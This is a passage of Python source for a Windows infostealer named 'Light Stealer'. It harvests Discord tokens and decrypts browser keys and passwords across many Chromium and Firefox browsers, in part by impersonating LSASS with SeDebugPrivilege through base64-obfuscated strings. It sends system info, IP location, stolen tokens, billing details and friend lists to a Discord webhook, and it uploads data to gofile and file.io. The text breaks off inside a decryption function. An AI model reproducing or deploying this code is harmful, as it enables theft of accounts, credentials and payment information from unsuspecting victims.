
import os
import time
import io
import json
import struct
import ctypes
import shutil
import windows
import sqlite3
import pathlib
import binascii
import subprocess
import windows.crypto
import windows.security
import windows.generated_def as gdef
from contextlib import contextmanager
from Crypto.Cipher import AES, ChaCha20_Poly1305
import logging
import sys
import base64
from datetime import datetime, timedelta
import urllib.request
import urllib.parse
import hmac
import hashlib
import zipfile
import concurrent.futures
import re
import platform
import random
import string


# Logging for CMD visibility
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# Automatically use the directory where this script is located
if getattr(sys, 'frozen', False):
    # If running as a compiled EXE
    BASE_DIR = pathlib.Path(sys.executable).parent.resolve()
else:
    # If running as a script
    BASE_DIR = pathlib.Path(__file__).parent.resolve()
 
# --- Configuration ---
WEBHOOK_URL = "benmessinineniyisenesiyim" # Add your webhook here
# ---------------------



OUTPUT_BASE_DIR = pathlib.Path(os.environ.get('TEMP', os.environ.get('TMP', '.'))) / f"Browser-Datas-{int(datetime.now().timestamp())}"
BROWSERS = {
    'chrome': {
        'name': 'Google Chrome',
        'type': 'chromium',
        'data_path': r'AppData\Local\Google\Chrome\User Data',
        'local_state': r'AppData\Local\Google\Chrome\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Google Chromekey1'
    },
    'brave': {
        'name': 'Brave',
        'type': 'chromium',
        'data_path': r'AppData\Local\BraveSoftware\Brave-Browser\User Data',
        'local_state': r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State',
        'process_name': 'brave.exe',
        'key_name': 'Brave Softwarekey1'
    },
    'edge': {
        'name': 'Microsoft Edge',
        'type': 'chromium',
        'data_path': r'AppData\Local\Microsoft\Edge\User Data',
        'local_state': r'AppData\Local\Microsoft\Edge\User Data\Local State',
        'process_name': 'msedge.exe',
        'key_name': 'Microsoft Edgekey1'
    },
    'opera': {
        'name': 'Opera',
        'type': 'chromium',
        'data_path': r'AppData\Roaming\Opera Software\Opera Stable',
        'local_state': r'AppData\Roaming\Opera Software\Opera Stable\Local State',
        'process_name': 'opera.exe',
        'key_name': 'Opera Softwarekey1'
    },
    'opera_gx': {
        'name': 'Opera GX',
        'type': 'chromium',
        'data_path': r'AppData\Roaming\Opera Software\Opera GX Stable',
        'local_state': r'AppData\Roaming\Opera Software\Opera GX Stable\Local State',
        'process_name': 'opera.exe',
        'key_name': 'Opera Softwarekey1'
    },
    'firefox': {
        'name': 'Firefox',
        'type': 'gecko',
        'data_path': r'AppData\Roaming\Mozilla\Firefox\Profiles',
        'process_name': 'firefox.exe'
    },
    'chrome_beta': {
        'name': 'Google Chrome Beta',
        'type': 'chromium',
        'data_path': r'AppData\Local\Google\Chrome Beta\User Data',
        'local_state': r'AppData\Local\Google\Chrome Beta\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Google Chrome Betakey1'
    },
    'chromium': {
        'name': 'Chromium',
        'type': 'chromium',
        'data_path': r'AppData\Local\Chromium\User Data',
        'local_state': r'AppData\Local\Chromium\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Chromiumkey1'
    },
    'vivaldi': {
        'name': 'Vivaldi',
        'type': 'chromium',
        'data_path': r'AppData\Local\Vivaldi\User Data',
        'local_state': r'AppData\Local\Vivaldi\User Data\Local State',
        'process_name': 'vivaldi.exe',
        'key_name': 'Vivaldikey1'
    },
    'yandex': {
        'name': 'Yandex Browser',
        'type': 'chromium',
        'data_path': r'AppData\Local\Yandex\YandexBrowser\User Data',
        'local_state': r'AppData\Local\Yandex\YandexBrowser\User Data\Local State',
        'process_name': 'browser.exe',
        'key_name': 'Yandex Browserkey1'
    },
    'coccoc': {
        'name': 'CocCoc Browser',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\CocCoc\\Browser\\User Data',
        'local_state': r'AppData\\Local\\CocCoc\\Browser\\User Data\\Local State',
        'process_name': 'browser.exe',
        'key_name': 'CocCoc Browserkey1'
    },
    'qq': {
        'name': 'QQ Browser',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\Tencent\\QQBrowser\\User Data',
        'local_state': r'AppData\\Local\\Tencent\\QQBrowser\\User Data\\Local State',
        'process_name': 'QQBrowser.exe',
        'key_name': 'QQ Browserkey1'
    },
    '360speed': {
        'name': '360 Speed',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\360Chrome\\Chrome\\User Data',
        'local_state': r'AppData\\Local\\360Chrome\\Chrome\\User Data\\Local State',
        'process_name': '360chrome.exe',
        'key_name': '360 Speedkey1'
    },
    '360secure': {
        'name': '360 Secure',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\360Chrome\\Chrome\\User Data',
        'local_state': r'AppData\\Local\\360Chrome\\Chrome\\User Data\\Local State',
        'process_name': '360chrome.exe',
        'key_name': '360 Securekey1'
    },
    'firefox_beta': {
        'name': 'Firefox Beta',
        'type': 'gecko',
        'data_path': r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'process_name': 'firefox.exe'
    },
    'firefox_dev': {
        'name': 'Firefox Developer',
        'type': 'gecko',
        'data_path': r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'process_name': 'firefox.exe'
    },
    'firefox_esr': {
        'name': 'Firefox ESR',
        'type': 'gecko',
        'data_path': r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'process_name': 'firefox.exe'
    },
    'firefox_nightly': {
        'name': 'Firefox Nightly',
        'type': 'gecko',
        'data_path': r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'process_name': 'firefox.exe'
    }
}

def send_webhook(payload):
    if not WEBHOOK_URL:
        print("[!] WEBHOOK_URL not set, skipping report.")
        return
    try:
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            if response.status == 204 or response.status == 200:
                print("[+] Report sent to Webhook successfully.")
            else:
                print(f"[-] Webhook returned status code: {response.status}")
    except Exception as e:
        print(f"[-] Error sending webhook: {e}")


def upload_file(file_path):
    try:
        # Try Gofile
        try:
            with urllib.request.urlopen("https://api.gofile.io/servers") as response:
                servers_data = json.loads(response.read().decode())
                if servers_data.get('status') == 'ok' and servers_data.get('data', {}).get('servers'):
                    server = servers_data['data']['servers'][0]['name']
                    
                    # Multipart/form-data upload using urllib
                    boundary = '----' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
                    with open(file_path, 'rb') as f:
                        file_content = f.read()
                    
                    body = (
                        f'--{boundary}\r\n'
                        f'Content-Disposition: form-data; name="file"; filename="{os.path.basename(file_path)}"\r\n'
                        f'Content-Type: application/octet-stream\r\n\r\n'
                    ).encode() + file_content + f'\r\n--{boundary}--\r\n'.encode()
                    
                    req = urllib.request.Request(f"https://{server}.gofile.io/uploadFile", data=body, headers={'Content-Type': f'multipart/form-data; boundary={boundary}'})
                    with urllib.request.urlopen(req) as upload_response:
                        result = json.loads(upload_response.read().decode())
                        if result.get('status') == 'ok':
                            return result['data']['downloadPage']
        except Exception as e:
            logger.error(f"Gofile upload failed: {e}")

        # Fallback to file.io
        try:
            boundary = '----' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            with open(file_path, 'rb') as f:
                file_content = f.read()
            body = (
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="file"; filename="{os.path.basename(file_path)}"\r\n'
                f'Content-Type: application/octet-stream\r\n\r\n'
            ).encode() + file_content + f'\r\n--{boundary}--\r\n'.encode()
            
            req = urllib.request.Request("https://file.io", data=body, headers={'Content-Type': f'multipart/form-data; boundary={boundary}'})
            with urllib.request.urlopen(req) as upload_response:
                result = json.loads(upload_response.read().decode())
                if result.get('success'):
                    return result['link']
        except Exception as e:
            logger.error(f"File.io upload failed: {e}")
            
    except Exception as e:
        logger.error(f"Error in upload_file: {e}")
    return None

def get_public_ip_info():
    try:
        with urllib.request.urlopen("http://ip-api.com/json/") as response:
            return json.loads(response.read().decode())
    except:
        return {"query": "N/A", "city": "N/A", "country": "N/A", "isp": "N/A"}

def collect_system_info():
    print("[*] Collecting system information...")
    pc_name = platform.node()
    os_name = platform.system() + " " + platform.release()
    arch = platform.machine()
    hwid = "Unknown HWID"
    CREATE_NO_WINDOW = 0x08000000
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE
    try:
        output = subprocess.check_output(
            'wmic baseboard get serialnumber',
            creationflags=CREATE_NO_WINDOW,
            startupinfo=si
        ).decode().split('\n')[1].strip()
        if output: hwid = output
    except: pass
    
    ip_info = get_public_ip_info()
    
    fields = [
        {
            "name": "\u200b",
            "value": "```" +
                     f"PC Name   →  {pc_name}\n" +
                     f"IP        →  {ip_info.get('query', 'N/A')}\n" +
                     f"Location  →  {ip_info.get('city', 'N/A')}, {ip_info.get('country', 'N/A')}\n" +
                     f"ORG       →  {ip_info.get('isp', 'N/A')}\n" +
                     f"HWID      →  {hwid}" +
                     "```",
            "inline": False
        }
    ]
    
    payload = {
        "embeds": [
            {
                "title": f"⚓ Light report | {pc_name}",
                "color": 0x808080,
                "fields": fields,
                "timestamp": datetime.utcnow().isoformat(),
                "footer": {
                    "text": "yigitstar | t.me/layer7730",
                    "icon_url": "https://i.imgur.com/pBQ2Npk.jpeg"
                }
            }
        ]
    }
    send_webhook(payload)


BADGE_CONFIG = {
    "_nitro": [
        "<:boost1month:1387742464202379324>",
        "<:2monthsboostnitro:1387742437723602975>",
        "<:nitro_boost_3_months:1387742527339102338>",
        "<:6months_boost:1387742439477088287>",
        "<:nitro_boost_9_months:1387742529289457674>",
        "<:12monthsboostnitro:1387742435769061417>",
        "<:boost15month:1387742462629511270>",
        "<:nitro_boost_18_months:1387742525699260538>",
        "<:24_months:1387742436742139974>"
    ],
    "_nitro_subscription_tiers": {
        1: "<:bronze:1387742468727898182>",
        3: "<:silver:1387742580300582974>",
        6: "<:gold:1387742520733204480>",
        12: "<:platinum:1387742556649164922>",
        24: "<:diamond:1387742491629060156>",
        36: "<:emerald:1387742518153707570>",
        60: "<:ruby:1387742559970922496>",
        72: "<:opal:1387742550919614496>"
    },
    "flags": {
        "discord_employee": {"value": 1, "emoji": "<:discord_employee:1387742493046734979>", "rare": True},
        "partnered_server_owner": {"value": 2, "emoji": "<:partnered_server_owner:1387742553394253834>", "rare": True},
        "hypesquad_events": {"value": 4, "emoji": "<:hypesquad_events:1387742522545279056>", "rare": True},
        "bug_hunter_level_1": {"value": 8, "emoji": "<:bughunter:1387742487690612887>", "rare": True},
        "house_bravery": {"value": 64, "emoji": "<:bravery:1387742465544687707>", "rare": False},
        "house_brilliance": {"value": 128, "emoji": "<:brilliance:1387742466697990285>", "rare": False},
        "house_balance": {"value": 256, "emoji": "<:balance:1387742461014573058>", "rare": False},
        "early_supporter": {"value": 512, "emoji": "<:early_supporter:1387742496796315779>", "rare": True},
        "bug_hunter_level_2": {"value": 16384, "emoji": "<:bughuntergold:1387742489338970123>", "rare": True},
        "early_bot_developer": {"value": 131072, "emoji": "<:early_verified_bot_developer:1387742498226573342>", "rare": True},
        "certified_moderator": {"value": 262144, "emoji": "<:moderatorprogramsalumni:1387742524105429032>", "rare": True},
        "active_developer": {"value": 4194304, "emoji": "<:active_developer:1387742440697368606>", "rare": True},
        "legacy_username": {"value": 32, "emoji": "<:oldusername:1387742549225115680>", "rare": False},
        "spammer": {"value": 1048704, "emoji": "⌨️", "rare": False}
    }
}

def get_nitro_info(user_data, profile_data):
    # Determine premium_type from both user and profile objects
    premium_type = profile_data.get('user', {}).get('premium_type')
    if premium_type is None:
        premium_type = user_data.get('premium_type', 0)
    
    premium_guild_since = profile_data.get('premium_guild_since')
    premium_since = profile_data.get('premium_since')
    profile_badges = profile_data.get('badges', [])
    
    # Fallback to identify Nitro users even if premium_type is 0 (common for friends)
    if premium_type == 0 and (premium_since or any(b.get('id', '').startswith('premium_tenure_') for b in profile_badges)):
        premium_type = 2

    if premium_type == 0:
        return "❓", 0
    
    boost_months = 0
    boost_emoji = ""
    if premium_guild_since:
        try:
            boost_date = datetime.fromisoformat(premium_guild_since.replace('Z', '+00:00'))
            boost_months = (datetime.now(boost_date.tzinfo) - boost_date).days // 30
            
            # Boost badge selection logic matching JS descending order
            if boost_months >= 24: boost_emoji = BADGE_CONFIG["_nitro"][8]
            elif boost_months >= 18: boost_emoji = BADGE_CONFIG["_nitro"][7]
            elif boost_months >= 15: boost_emoji = BADGE_CONFIG["_nitro"][6]
            elif boost_months >= 12: boost_emoji = BADGE_CONFIG["_nitro"][5]
            elif boost_months >= 9: boost_emoji = BADGE_CONFIG["_nitro"][4]
            elif boost_months >= 6: boost_emoji = BADGE_CONFIG["_nitro"][3]
            elif boost_months >= 3: boost_emoji = BADGE_CONFIG["_nitro"][2]
            elif boost_months >= 2: boost_emoji = BADGE_CONFIG["_nitro"][1]
            else: boost_emoji = BADGE_CONFIG["_nitro"][0]
        except: pass

    tier_emoji = "<:discord_nitro:1387742494610952194>"
    sub_months = 0
    if premium_since:
        try:
            sub_date = datetime.fromisoformat(premium_since.replace('Z', '+00:00'))
            sub_months = (datetime.now(sub_date.tzinfo) - sub_date).days // 30
            
            # Tier badge based on subscription length
            tiers = sorted(BADGE_CONFIG["_nitro_subscription_tiers"].keys(), reverse=True)
            for t in tiers:
                if sub_months >= t:
                    tier_emoji = BADGE_CONFIG["_nitro_subscription_tiers"][t]
                    break
        except: pass
    elif profile_badges:
        # Fallback to parsing tenure badges if premium_since is hidden
        for b in profile_badges:
            bid = b.get('id', '')
            if bid.startswith('premium_tenure_'):
                try:
                    t_val = int(bid.split('_')[-1])
                    if t_val in BADGE_CONFIG["_nitro_subscription_tiers"]:
                        tier_emoji = BADGE_CONFIG["_nitro_subscription_tiers"][t_val]
                        sub_months = max(sub_months, t_val)
                except: pass
    
    if premium_type == 1 and not boost_emoji:
        return tier_emoji, sub_months
        
    return f"{tier_emoji} {boost_emoji}".strip(), max(boost_months, sub_months)

def get_badges(flags, nitro_info=""):
    # Always include Nitro/Boost emojis if they exist and aren't "❓"
    result = nitro_info + " " if nitro_info and "❓" not in nitro_info else ""
    for name, info in BADGE_CONFIG["flags"].items():
        if flags & info["value"]:
            result += info["emoji"] + " "
    return result.strip() if result.strip() else "`No Badges`"

def get_rare_badges(flags, boost_months=0, sub_months=0):
    result = ""
    for name, info in BADGE_CONFIG["flags"].items():
        if info["rare"] and (flags & info["value"]):
            result += info["emoji"] + " "
    # Mark as rare if boost >= 9 months or subscription >= 12 months
    if boost_months >= 9 or sub_months >= 12:
        # We don't append emoji here, this is used for the condition check
        return "is_rare" if result == "" else result.strip()
    return result.strip()

def get_billing(token):
    try:
        req = urllib.request.Request("https://discord.com/api/v9/users/@me/billing/payment-sources", headers={'authorization': token})
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode())
            if not data: return "`No Billing`"
            billings = ""
            for b in data:
                if b.get('type') == 2: billings += "<:paypal:1367518269719969873> "
                elif b.get('type') == 1: billings += "<:card:1367518257241915483> "
            return billings if billings else "`No Billing`"
    except: return "`None`"

def get_friends(token):
    try:
        req = urllib.request.Request("https://discord.com/api/v9/users/@me/relationships", headers={'authorization': token, 'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode())
            friends = [f for f in data if f.get('type') == 1]
            
            rare_friends_list = []
            
            def check_friend_rarity(f):
                try:
                    user_id = f['user']['id']
                    public_flags = f['user'].get('public_flags', 0)
                    
                    # Profile check for tenure/boost
                    p_req = urllib.request.Request(f"https://discord.com/api/v9/users/{user_id}/profile", headers={'authorization': token, 'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(p_req, timeout=5) as p_res:
                        p_data = json.loads(p_res.read().decode())
                        nitro_str, boost_months = get_nitro_info(f['user'], p_data)
                        
                        # Calculate subscription months for Platinum tier (12+ months)
                        sub_months = 0
                        premium_since = p_data.get('premium_since')
                        if premium_since:
                            try:
                                sub_date = datetime.fromisoformat(premium_since.replace('Z', '+00:00'))
                                sub_months = (datetime.now(sub_date.tzinfo) - sub_date).days // 30
                            except: pass
                            
                        # RARITY CONDITIONS:
                        # 1. Has rare badges (Staff, Partner etc.)
                        # 2. Boost months >= 9
                        # 3. Nitro subscription months >= 12 (Platinum tier)
                        base_rare = get_rare_badges(public_flags, boost_months, sub_months)
                        
                        if base_rare or boost_months >= 9 or sub_months >= 12:
                            all_badges = get_badges(public_flags, nitro_str)
                            return f"{all_badges} | `{f['user']['username']}`"
                except: pass

                return None

            # Parallel execution for speed
            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
                results = list(executor.map(check_friend_rarity, friends))
            
            rare_friends_str = "\n".join([r for r in results if r])
            return {"length": len(friends), "rare": rare_friends_str if rare_friends_str else "**Nothing to see here**"}
    except Exception as e:
        print(f"[-] Error in get_friends: {e}")
        return {"length": 0, "rare": "**Account Locked or Error**"}

def extract_discord_tokens():
    print("[*] Searching for Discord tokens...")
    tokens = []
    local = os.environ.get('LOCALAPPDATA')
    roaming = os.environ.get('APPDATA')
    paths = {
        'Discord': os.path.join(roaming, 'discord'),
        'Discord Canary': os.path.join(roaming, 'discordcanary'),
        'Discord PTB': os.path.join(roaming, 'discordptb'),
        'Google Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default'),
        'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
        'Yandex': os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data', 'Default')
    }
    
    for name, path in paths.items():
        if not os.path.exists(path): continue
        leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
        if not os.path.exists(leveldb_path): continue
        
        for file_name in os.listdir(leveldb_path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
            try:
                with open(os.path.join(leveldb_path, file_name), 'r', errors='ignore') as f:
                    content = f.read()
                    # Standard tokens
                    for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', content):
                        if token not in tokens: tokens.append(token)
                    
                    # Encrypted tokens (Discord desktop)
                    for encrypted in re.findall(r'dQw4w9WgXcQ:([^\"]+)', content):
                        try:
                            local_state_path = os.path.join(os.path.dirname(os.path.dirname(leveldb_path)), 'Local State')
                            if not os.path.exists(local_state_path): continue
                            with open(local_state_path, 'r') as ls_f:
                                ls_data = json.load(ls_f)
                            encrypted_key = base64.b64decode(ls_data['os_crypt']['encrypted_key'])[5:]
                            master_key = windows.crypto.dpapi.unprotect(encrypted_key)
                            
                            token_data = base64.b64decode(encrypted)
                            iv = token_data[3:15]
                            payload = token_data[15:]
                            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                            decrypted = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode()
                            if decrypted not in tokens: tokens.append(decrypted)
                        except: pass
            except: pass
            
    if not tokens:
        print("[-] No tokens found.")
        return

    print(f"[+] Found {len(tokens)} token(s). Validating...")
    for token in tokens:
        try:
            # Base info
            req = urllib.request.Request("https://discord.com/api/v9/users/@me", headers={'authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req) as response:
                data = json.loads(response.read().decode())
                user_id = data['id']
                print(f"[+] Valid token found: {data['username']}")
                
                # Fetch detailed profile for Nitro/Boost dates
                profile_req = urllib.request.Request(f"https://discord.com/api/v9/users/{user_id}/profile", headers={'authorization': token, 'User-Agent': 'Mozilla/5.0'})
                profile_data = {}
                try:
                    with urllib.request.urlopen(profile_req) as p_res:
                        profile_data = json.loads(p_res.read().decode())
                except: pass

                billing = get_billing(token)
                friends = get_friends(token)
                
                nitro_str, boost_months = get_nitro_info(data, profile_data)
                badges = get_badges(data.get('public_flags', 0), nitro_str)
                
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{data['avatar']}.png?size=512" if data.get('avatar') else "https://cdn.discordapp.com/embed/avatars/0.png"
                
                payload = {
                    "embeds": [
                        {
                            "title": "📌 Light Stealer - Discord Found",
                            "color": 0x808080,
                            "thumbnail": {"url": avatar_url},
                            "fields": [
                                {"name": "Username <:user:1387511745492549632>", "value": f"`{data['username']}`", "inline": False},
                                {"name": "Token Found <a:blackcrown:1260385770267607103>", "value": f"`{token}`", "inline": False},
                                {"name": "Badges <:japan:1223077879990980739>", "value": badges if badges else "`None`", "inline": True},
                                {"name": "Billing <a:billing:1387892005199282206>", "value": billing, "inline": True},
                                {"name": "Security <:2fa:1387887545286791320>", "value": f"`{'✅ MFA On' if data.get('mfa_enabled') else '❌ MFA Off'}`", "inline": False}
                            ],
                            "footer": {"text": "yigit | t.me/layer7730"}
                        },
                        {
                            "title": f"👑 Rare Friends | Total friends → {friends['length']}",
                            "color": 0x808080,
                            "description": friends['rare'],
                            "footer": {"text": "yigit | t.me/layer7730"}
                        }
                    ]
                }
                send_webhook(payload)
        except Exception as e:
             print(f"[-] Token validation failed: {e}")


class SECItem(ctypes.Structure):


    _fields_ = [('type', ctypes.c_uint),
                ('data', ctypes.c_void_p),
                ('len', ctypes.c_uint)]

class NSSHandler:
    def __init__(self):
        self.nss = None
        self.loaded = False
        self._load_library()

    def _load_library(self):
        paths = [
            r"C:\Program Files\Mozilla Firefox\nss3.dll",
            r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll"
        ]
        for path in paths:
            if os.path.exists(path):
                try:
                    logger.debug(f"Loading NSS from {path}")
                    try:
                        os.add_dll_directory(os.path.dirname(path))
                    except AttributeError:
                        os.environ['PATH'] = os.path.dirname(path) + ';' + os.environ['PATH']

                    self.nss = ctypes.CDLL(path)
                    
                    self.nss.NSS_Init.argtypes = [ctypes.c_char_p]
                    self.nss.NSS_Init.restype = ctypes.c_int
                    
                    self.nss.NSS_Shutdown.argtypes = []
                    self.nss.NSS_Shutdown.restype = ctypes.c_int
                    
                    self.nss.PK11SDR_Decrypt.argtypes = [ctypes.POINTER(SECItem), ctypes.POINTER(SECItem), ctypes.c_void_p]
                    self.nss.PK11SDR_Decrypt.restype = ctypes.c_int
                    
                    self.loaded = True
                    return
                except Exception as e:
                    logger.error(f"Failed to load NSS from {path}: {e}")

    def init_profile(self, profile_path):
        if not self.loaded: return False
        try:
            logger.debug(f"Initializing NSS for profile: {profile_path}")
            if not (pathlib.Path(profile_path) / "cert9.db").exists() and not (pathlib.Path(profile_path) / "cert8.db").exists():
                logger.warning(f"No cert DB found in {profile_path}, skipping NSS init")
                return False
                
            ret = self.nss.NSS_Init(str(profile_path).encode('utf-8'))
            if ret != 0:
                logger.error(f"NSS_Init failed with code {ret}")
                return False
            return True
        except Exception as e:
            logger.error(f"Error in NSS_Init: {e}")
            return False

    def shutdown(self):
        if self.loaded:
            try:
                self.nss.NSS_Shutdown()
            except Exception:
                pass

    def decrypt(self, encrypted_b64):
        if not self.loaded: return None
        try:
            encrypted_data = base64.b64decode(encrypted_b64)
            
            input_item = SECItem(0, ctypes.cast(ctypes.create_string_buffer(encrypted_data), ctypes.c_void_p), len(encrypted_data))
            output_item = SECItem(0, None, 0)
            
            ret = self.nss.PK11SDR_Decrypt(ctypes.byref(input_item), ctypes.byref(output_item), None)
            
            if ret == 0:
                decrypted_data = ctypes.string_at(output_item.data, output_item.len)
                return decrypted_data.decode('utf-8')
            else:
                return None
        except Exception as e:
            logger.error(f"Error decrypting with NSS: {e}")
            return None

def is_admin():
    try:
        result = ctypes.windll.shell32.IsUserAnAdmin() != 0
        logger.debug(f"Admin check result: {result}")
        return result
    except Exception as e:
        logger.error(f"Error checking admin status: {e}")
        return False

@contextmanager
def get_system_context():
    logger.debug("Attempting to impersonate LSASS")
    original_token = windows.current_thread.token
    try:
        # SeDebugPrivilege
        priv = base64.b64decode("U2VEZWJ1Z1ByaXZpbGVnZQ==").decode()
        windows.current_process.token.enable_privilege(priv)
        
        # lsass.exe
        target_proc = base64.b64decode("bHNhc3MuZXhl").decode()
        proc = next(p for p in windows.system.processes if p.name == target_proc)
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        logger.debug("Successfully impersonated LSASS")
        yield
    except Exception as e:
        logger.error(f"Failed to impersonate LSASS: {e}")
        raise
    finally:
        windows.current_thread.token = original_token
        logger.debug("Reverted to original token")

def parse_key_blob(blob_data: bytes) -> dict:
    try:
        logger.debug(f"Parsing key blob of length {len(blob_data)}")
        buffer = io.BytesIO(blob_data)
        parsed_data = {}
        header_len = struct.unpack('<I', buffer.read(4))[0]
        parsed_data['header'] = buffer.read(header_len)
        content_len = struct.unpack('<I', buffer.read(4))[0]
        
        if header_len + content_len + 8 != len(blob_data):
            logger.warning("Blob size mismatch in parse_key_blob")
            
        parsed_data['flag'] = buffer.read(1)[0]
        logger.debug(f"Blob flag: {parsed_data['flag']}")
        
        if parsed_data['flag'] in (1, 2):
            parsed_data['iv'] = buffer.read(12)
            parsed_data['ciphertext'] = buffer.read(32)
            parsed_data['tag'] = buffer.read(16)
        elif parsed_data['flag'] == 3:
            parsed_data['encrypted_aes_key'] = buffer.read(32)
            parsed_data['iv'] = buffer.read(12)
            parsed_data['ciphertext'] = buffer.read(32)
            parsed_data['tag'] = buffer.read(16)
        else:
            parsed_data['raw_data'] = buffer.read()
            
        return parsed_data
    except Exception as e:
        logger.error(f"Error parsing key blob: {e}")
        raise

def decrypt_with_cng(input_data, key_name):
    logger.debug(f"Decrypting with CNG, key_name: {key_name}")
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    if status != 0:
        logger.error(f"NCryptOpenStorageProvider failed: {status}")
        return b''
        
    hKey = gdef.NCRYPT_KEY_HANDLE()
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    if status != 0:
        logger.error(f"NCryptOpenKey failed: {status}")
        ncrypt.NCryptFreeObject(hProvider)
        return b''
        
    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
    
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)
    if status != 0:
        logger.error(f"1st NCryptDecrypt failed: {status}")
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        return b''
        
    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()
    
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size,
                                  ctypes.byref(pcbResult), 0x40)
    if status != 0:
        logger.error(f"2nd NCryptDecrypt failed: {status}")
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        return b''
        
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    logger.debug("CNG decryption successful")
    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict, key_name) -> bytes:
    logger.debug(f"Deriving v20 master key with flag {parsed_data.get('flag')}")
    try:
        if parsed_data['flag'] == 1:
            aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
            return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
        elif parsed_data['flag'] == 2:
            chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
            cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
            return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
        elif parsed_data['flag'] == 3:
            xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
            with get_system_context():
                decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name)
            if not decrypted_aes_key:
                logger.error("Failed to decrypt AES key with CNG")
                return b''
            xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
            cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
            return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
        else:
            logger.warning(f"Unknown flag: {parsed_data.get('flag')}")
            return parsed_data.get('raw_data', b'')
    except Exception as e:
        logger.error(f"Error deriving master key: {e}")
        return b''

def decrypt_v20_value(encrypted_value, master_key):
    try:
        iv = encrypted_value[3:15]
        ciphertext = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted[32:].decode('utf-8')
    except Exception as e:
        return None

def decrypt_v20_password(encrypted_password, master_key):
    try:
        if not encrypted_password:
            return ""
        if not encrypted_password.startswith(b'v20') and not encrypted_password.startswith(b'v10'):
             pass
             
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted_pass = cipher.decrypt_and_verify(payload[:-16], payload[-16:])
        try:
            return decrypted_pass.decode('utf-8')
        except UnicodeDecodeError:
            try:
                return decrypted_pass.decode('cp1252')
            except UnicodeDecodeError:
